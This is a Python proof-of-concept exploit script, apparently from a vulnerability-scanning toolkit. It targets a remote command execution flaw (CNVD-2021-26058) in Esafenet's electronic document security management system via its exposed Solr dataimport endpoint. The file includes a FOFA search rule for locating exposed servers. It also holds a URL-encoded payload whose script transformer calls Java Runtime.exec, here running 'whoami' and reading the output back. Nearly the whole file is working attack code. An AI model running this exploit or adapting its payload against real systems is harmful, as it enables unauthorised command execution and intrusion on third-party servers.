#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import re

from Config.config_proxies import proxies
from Config.config_requests import headers

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME = 'CNVD_2021_26058'
AUTHOR = "JDQ"
REMARK = '亿赛通电子文档安全管理系统远程命令执行漏洞'
FOFA_RULE = 'title="电子文档安全管理系统"'
######################################################


def poc(target):
    try:
        r = requests.get(target+"/solr/admin/cores",headers=headers, verify=False,proxies=proxies)
        if r.status_code == 200 and 'responseHeader' in r.text:
            result = re.search(
                r'<str name="name">([\s\S]*?)</str><str name="instanceDir">', r.text, re.I
            )
            core_name = result.group(1)           
            return(POC_2(target, core_name))
    except :
        pass


def POC_2(target, core_name):
    result={}
    url = target + \
        "/solr/"+ core_name + "/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"
    files = {
        'stream.body': '''<?xml version="1.0" encoding="UTF-8"?>
        <RDF>
        <item/>
        </RDF>'''
    }

    try:
        r = requests.post(url, data=files, verify=False,proxies=proxies)
        if r.status_code == 200 and 'responseHeader' in r.text:
            cmd = re.search(
                r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', r.text, re.I)
            res = cmd.group(1)
            result['target'] = target
            result['poc'] = NAME
            result['whoami'] = res
            return result
    except:
        pass

if __name__ == '__main__':
    poc("127.0.0.1")
